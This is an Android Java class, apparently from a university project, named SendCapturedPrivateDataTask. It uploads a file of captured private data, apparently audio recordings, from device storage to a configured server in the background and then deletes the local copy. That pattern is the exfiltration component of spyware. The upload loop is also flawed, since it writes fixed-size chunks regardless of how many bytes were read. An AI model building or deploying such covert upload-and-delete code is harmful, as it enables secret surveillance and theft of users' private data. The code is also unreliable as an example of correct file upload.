package edu.glyndwr.rest.tasks;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

import edu.glyndwr.utils.Constants;
import edu.glyndwr.utils.Utils;
import android.os.AsyncTask;

/**
 * Sending all data to server
 * 
 * @author Karpachev Ihor
 * 
 */
public class SendCapturedPrivateDataTask extends AsyncTask<Void, Void, Void> {

	// file absolute file on android device
	private String filename;
	
	public SendCapturedPrivateDataTask(String pathToFile) {
		filename = Constants.STORAGE_DIR+ pathToFile;
	}

	@Override
	protected Void doInBackground(Void... params) {
		sendfile();
		return null;
	}

	@Override
	protected void onPostExecute(Void result) {

	}

	public void sendfile() {

		HttpURLConnection conn = null;
		DataOutputStream dos = null;

		String lineEnd = "\r\n";
		String twoHyphens = "--";
		String boundary = "*****";
		int bytesRead, bufferSize;
		byte[] buffer;
		Utils.LOG("Transfering : " + filename);
		

		File sourceFile = new File(filename);
		if (!sourceFile.isFile()) {
			Utils.LOG("Source File coudnt tranffer");
			return;
		}
		int serverResponseCode = 0;
		try {

			// open a URL connection to the Servlet
			FileInputStream fileInputStream = new FileInputStream(sourceFile);

			// ------------------ CLIENT REQUEST
			URL url = new URL(Constants.UPLOAD_SERVER_URI);

			// Open a HTTP connection to the URL
			conn = (HttpURLConnection) url.openConnection();
			conn.setDoInput(true); // Allow Inputs
			conn.setDoOutput(true); // Allow Outputs
			conn.setUseCaches(false); // Don't use a Cached Copy

			// Use a post method.
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Connection", "Keep-Alive");

			conn.setRequestProperty("ENCTYPE", "multipart/form-data");
			conn.setRequestProperty("Content-Type","multipart/form-data;boundary=" + boundary);
			conn.setRequestProperty("file_name", filename);
			conn.setRequestProperty("file_name_audio", filename);
			// conn.setRequestProperty("X-myapp-param1", userIdParameter);

			// conn.setFixedLengthStreamingMode(1024);
			// conn.setChunkedStreamingMode(1);

			dos = new DataOutputStream(conn.getOutputStream());

			dos.writeBytes(twoHyphens + boundary + lineEnd);

			dos.writeBytes("Content-Disposition: form-data; name=\"file_name\";filename=\""+ filename + "\"" + lineEnd);

			dos.writeBytes(lineEnd);

			int streamSize = (int) sourceFile.length();
			bufferSize = streamSize / 10;

			buffer = new byte[streamSize];

			// read file and write it into form...
			bytesRead = fileInputStream.read(buffer, 0, bufferSize);
			int count = 0;
			while (bytesRead > 0) {

				dos.write(buffer, 0, bufferSize);
				// bufferSize = Math.min(bytesAvailable, maxBufferSize);
				bytesRead = fileInputStream.read(buffer, 0, bufferSize);
				count += 10;
			}

			// send multipart form data necesssary after file data...
			dos.writeBytes(lineEnd);
			dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

			// Responses from the server (code and message)
			serverResponseCode = conn.getResponseCode(); 
			String serverResponseMessage = conn.getResponseMessage();

			Utils.LOG("Upload file to serverHTTP Response is : " + serverResponseMessage + ": " + serverResponseCode);

			fileInputStream.close();
			dos.flush();
			dos.close();
			sourceFile.delete();
		} catch (MalformedURLException ex) {
			ex.printStackTrace();
			Utils.LOG("error: " + ex.getMessage());
		} catch (Exception e) {
			e.printStackTrace();
			Utils.LOG("error: " + e.getMessage());
		}
		// this block will give the response of upload link
		try {
			BufferedReader rd = new BufferedReader(new InputStreamReader(conn.getInputStream()));
			String line;
			while ((line = rd.readLine()) != null) {
				System.out.println("RESULT Message: " + line);
			}
			rd.close();
		} catch (IOException ioex) {
			Utils.LOG("error: " + ioex.getMessage());
		}
		return; // like 200 (Ok)

	}
}
